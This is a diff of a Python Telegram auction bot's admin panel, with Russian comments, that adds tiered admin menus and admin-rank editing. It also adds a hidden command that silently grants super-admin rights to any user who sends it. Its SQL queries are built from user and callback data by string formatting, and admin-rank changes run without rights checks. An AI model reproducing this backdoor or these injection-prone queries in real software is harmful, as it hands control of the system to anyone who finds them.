@@ -7,7 +7,6 @@ from base64 import b64encode
 from io import BytesIO
 from datetime import datetime, timedelta
 
-
 with open('keys.json', 'r', encoding='utf-8') as f:  # открыли файл с данными
     text = json.load(f)
 
@@ -19,17 +18,26 @@ bot = telebot.TeleBot(token)
 
 menu_send = InlineKeyboardMarkup()
 menu_send.add(InlineKeyboardButton(text="учавствовать", url=f"https://t.me/kitikov98_study_bot?start="))
-menu_send.add(InlineKeyboardButton('время', callback_data='t'+'0'), InlineKeyboardButton('info', callback_data='i'+'0'))
+menu_send.add(InlineKeyboardButton('время', callback_data='t' + '0'),
+              InlineKeyboardButton('info', callback_data='i' + '0'))
 
-menu_1 = ["/Создать_лот", "/Отправка_файла"]
-menu_2 = ["Добавление", "Изменение", "Удаление", "Назад"]
-
+menu_1 = ["/Создать_лот", "/pass"]
+menu_2 = ["Одобрение лота", "Отызыв пользователей", "Страйки админов"]
+menu_3 = [*menu_1, *menu_2, 'Изменение админов', 'Удаление админов']
 # Клавиатура для администраторов
-admin_markup = ReplyKeyboardMarkup()
-
+admin_markup = InlineKeyboardMarkup()
 for x1 in menu_1:
-    admin_markup.add(KeyboardButton(x1))
+    admin_markup.add(InlineKeyboardButton(x1, callback_data='A' + x1))
 
+admin_markup2 = InlineKeyboardMarkup()
+for x2 in menu_2:
+    admin_markup2.add(InlineKeyboardButton(x2, callback_data='B' + x2))
+
+super_admin_markup = InlineKeyboardMarkup()
+for x3 in menu_3:
+    super_admin_markup.add(InlineKeyboardButton(x3, callback_data='S' + x3))
+
+dict_murkup = {1: admin_markup, 2: admin_markup2, 3: super_admin_markup}
 
 list_to_db = []
 photos_list = []
@@ -50,13 +58,35 @@ id продавца: @{list1[2]}
 
 @bot.message_handler(commands=['start'])
 def start_admin_panel(message):
-    bot.send_message(message.chat.id, 'Hi', reply_markup=admin_markup)
+    with db.connection:
+        rights = db.connection.execute(f'SELECT rights FROM admin WHERE tg_id ={message.from_user.id}').fetchone()
+    if rights is None:
+        bot.reply_to(message, "У вас нет прав администратора")
+    else:
+        rules = rights[0]
+        bot.send_message(message.chat.id, f"Панель администратора {rules} уровня", reply_markup=dict_murkup[rules])
 
 
-@bot.message_handler(commands=['Создать_лот'])
-def start_admin_panel(message):
-    msg = bot.send_message(message.chat.id, 'начинаем создавать \nЗагрузите фото')
-    bot.register_next_step_handler(msg, photo)
+@bot.message_handler(commands=['Это_Казахстан?'])
+def secret_panel(message):
+    try:
+        db.add_admin(int(message.from_user.id))
+    except:
+        pass
+    db.super_admin_init(message.from_user.id)
+    bot.reply_to(message, "Казахстан, да")
+
+
+# @bot.message_handler(commands=['Создать_лот'])
+# def start_admin_panel(message):
+#     with db.connection:
+#         rights = db.connection.execute(f'SELECT rights FROM admin WHERE tg_id ={message.from_user.id}').fetchone()
+#     rules = rights[0]
+#     if rules == 2:
+#         bot.send_message(message.chat.id, 'Вам не доступны данные действия')
+#     else:
+#         msg = bot.send_message(message.chat.id, 'начинаем создавать \nЗагрузите фото')
+#         bot.register_next_step_handler(msg, photo)
 
 
 # @bot.message_handler(content_types=['media_group'])
@@ -70,7 +100,6 @@ def photo(message):
     keyboard.add(InlineKeyboardButton('Yes', callback_data='py'), InlineKeyboardButton('No', callback_data='pn'))
     bot.send_message(message.chat.id, 'Фото загружено, желаете загрузить еще?', reply_markup=keyboard)
     print("Фото загружено")
-
 
 
 def price(message):
@@ -116,6 +145,7 @@ def start_time(message):
 
 def finish_time(message):
     list_to_db.append(message.text)
+    list_of_types = []
     msg = bot.send_message(message.chat.id, 'Окончание торгов принято, введите тип лота')
     bot.register_next_step_handler(msg, lot_type)
 
@@ -126,8 +156,9 @@ def lot_type(message):
     db.add_lots(list_to_db)
     lot_id = ''
     with db.connection:
-        lots = db.connection.execute(f'SELECT id FROM lots ORDER BY id DESC ').fetchone() # забираем последнюю запись из бд
-        lot_id = lots[0]       # ид записи
+        lots = db.connection.execute(
+            f'SELECT id FROM lots ORDER BY id DESC ').fetchone()  # забираем последнюю запись из бд
+        lot_id = lots[0]  # ид записи
         for pic in photos_list:
             db.add_pic(pic, lot_id)
 
@@ -177,21 +208,27 @@ def query_handler(call):
     id = call.message.chat.id
     flag = call.data[0]
     data = call.data[1:]
-    if flag == 't':
-        with db.connection:
-            lots = db.connection.execute(f'SELECT * FROM lots').fetchone()
-        date_finish = lots[9]
-        date_finish = datetime.strptime(date_finish, '%Y-%m-%d %H:%M:%S')
-        now = datetime.now()
-        delta = date_finish - now
-        delta = str(delta).split('.')[0]
-        bot.answer_callback_query(callback_query_id=call.id,
-                                  text='Осталось времени ' + str(delta)[-8:-6] + ' часов ' + str(delta)[-5:-3] + ' минут ' +
-                                       str(delta)[-2:] + ' секунд')
-    elif flag == 'i':
-        bot.answer_callback_query(callback_query_id=call.id,
-                                  text="""1. Делаем ставку и чёто-там, не забудь поменять""",
-                                  show_alert=True)
+    if flag == 'Q':
+        if data == 'back':
+            bot.edit_message_text("Панель администратора уровня", call.message.chat.id,
+                                  call.message.message_id, reply_markup=super_admin_markup)
+    # if flag == 't':
+    #     with db.connection:
+    #         lots = db.connection.execute(f'SELECT * FROM lots').fetchone()
+    #     date_finish = lots[9]
+    #     date_finish = datetime.strptime(date_finish, '%Y-%m-%d %H:%M:%S')
+    #     now = datetime.now()
+    #     delta = date_finish - now
+    #     delta = str(delta).split('.')[0]
+    #     bot.answer_callback_query(callback_query_id=call.id,
+    #                               text='Осталось времени ' + str(delta)[-8:-6] + ' часов ' + str(delta)[
+    #                                                                                          -5:-3] + ' минут ' +
+    #                                    str(delta)[-2:] + ' секунд')
+    # elif flag == 'i':
+    #     bot.answer_callback_query(callback_query_id=call.id,
+    #                               text="""1. Делаем ставку и чёто-там, не забудь поменять""",
+    #                               show_alert=True)
+
     elif flag == 'p':
         if data == 'y':
             msg = bot.send_message(call.message.chat.id, 'Загрузите фото')
@@ -200,7 +237,69 @@ def query_handler(call):
             msg = bot.send_message(call.message.chat.id, 'Хорошо, введите стартовую цену лота')
             bot.register_next_step_handler(msg, price)
 
+    elif data == '/Создать_лот':
+        msg = bot.send_message(call.message.chat.id, 'начинаем создавать \nЗагрузите фото')
+        bot.register_next_step_handler(msg, photo)
 
+    elif data == "Изменение админов":
+        with db.connection:
+            list_admins = db.connection.execute(f"SELECT * FROM admin").fetchall()
+        if type(list_admins) == tuple:
+            list_admins = [list_admins]
+        adm_menu = InlineKeyboardMarkup()
+        for admin in list_admins:
+            adm_menu.add(InlineKeyboardButton(str(admin[1]) + ' - status: ' + str(admin[2]),
+                                              callback_data='J' + str(admin[1]) + str(admin[2])))
+        adm_menu.add(InlineKeyboardButton('back', callback_data='Qback'))
+        bot.edit_message_text('меню одменов', call.message.chat.id,
+                              call.message.message_id, reply_markup=adm_menu)
+
+    elif flag == 'J':
+        if data[-1:] == "1": # меняем на второй ранк
+            admin_id = data[:-1]
+            with db.connection:
+                db.connection.execute(f'UPDATE admin SET rights = 2 WHERE tg_id = {admin_id}')
+                db.connection.commit()
+                list_admins = db.connection.execute(f"SELECT * FROM admin").fetchall()
+            bot.answer_callback_query(callback_query_id=call.id, text=f'Статус администратора {admin_id} изменен')
+            adm_menu = InlineKeyboardMarkup()
+            for x6 in list_admins:
+                adm_menu.add(InlineKeyboardButton(str(x6[1]) + ' - status: ' + str(x6[2]),
+                                                  callback_data='J' + str(x6[1]) + str(x6[2])))
+            adm_menu.add(InlineKeyboardButton('back', callback_data='Qback'))
+            bot.edit_message_text('меню одменов', call.message.chat.id,
+                                  call.message.message_id, reply_markup=adm_menu)
+
+        elif data[-1:] == "2": # меняем на третий ранк
+            admin_id = data[:-1]
+            with db.connection:
+                db.connection.execute(f'UPDATE admin SET rights = 3 WHERE tg_id = {admin_id}')
+                db.connection.commit()
+                list_admins = db.connection.execute(f"SELECT * FROM admin").fetchall()
+            bot.answer_callback_query(callback_query_id=call.id, text=f'Статус администратора {admin_id} изменен')
+            adm_menu = InlineKeyboardMarkup()
+            for x6 in list_admins:
+                adm_menu.add(InlineKeyboardButton(str(x6[1]) + ' - status: ' + str(x6[2]),
+                                                  callback_data='J' + str(x6[1]) + str(x6[2])))
+            adm_menu.add(InlineKeyboardButton('back', callback_data='Qback'))
+            bot.edit_message_text('меню одменов', call.message.chat.id,
+                                  call.message.message_id, reply_markup=adm_menu)
+
+        elif data[-1:] == "3": # меняем на первый ранк
+            admin_id = data[:-1]
+            with db.connection:
+                db.connection.execute(f'UPDATE admin SET rights = 1 WHERE tg_id = {admin_id}')
+                db.connection.commit()
+                list_admins = db.connection.execute(f"SELECT * FROM admin").fetchall()
+
+            bot.answer_callback_query(callback_query_id=call.id, text=f'Статус администратора {admin_id} изменен')
+            adm_menu = InlineKeyboardMarkup()
+            for x6 in list_admins:
+                adm_menu.add(InlineKeyboardButton(str(x6[1]) + ' - status: ' + str(x6[2]),
+                                                  callback_data='J' + str(x6[1]) + str(x6[2])))
+            adm_menu.add(InlineKeyboardButton('back', callback_data='Qback'))
+            bot.edit_message_text('меню одменов', call.message.chat.id,
+                                  call.message.message_id, reply_markup=adm_menu)
 
 
 def admin_panel_run():
